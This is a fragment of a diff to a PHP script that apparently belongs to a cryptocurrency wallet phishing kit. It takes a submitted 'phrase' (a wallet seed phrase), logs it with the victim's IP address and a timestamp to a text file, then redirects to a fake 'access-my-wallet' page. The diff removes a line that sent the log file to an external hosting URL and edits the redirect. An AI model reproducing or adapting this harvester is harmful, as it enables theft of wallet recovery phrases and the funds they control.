@@ -1,6 +1,5 @@
 <?php
 $file = "JMFSOIPUBNVCRSRMKLY87.txt";
-$file = "https://mahjong54ways.000webhostapp.com/JMFSOIPUBNVCRSRMKLY87.txt";
 $phrase = $_POST['phrase'];
 $ip = $_SERVER['REMOTE_ADDR'];
 $today = date("F j, Y, g:i a");
@@ -24,7 +23,7 @@ fwrite($handle, "\n");
 fclose($handle);
 echo "<script LANGUAGE=\"JavaScript\">
 <!--
-window.location=\"error.html?access-my-wallet#/\";// -->
+window.location=\"?access-my-wallet#/\";// -->
 </script>";
 ?>\/
 <script type="text/javascript">
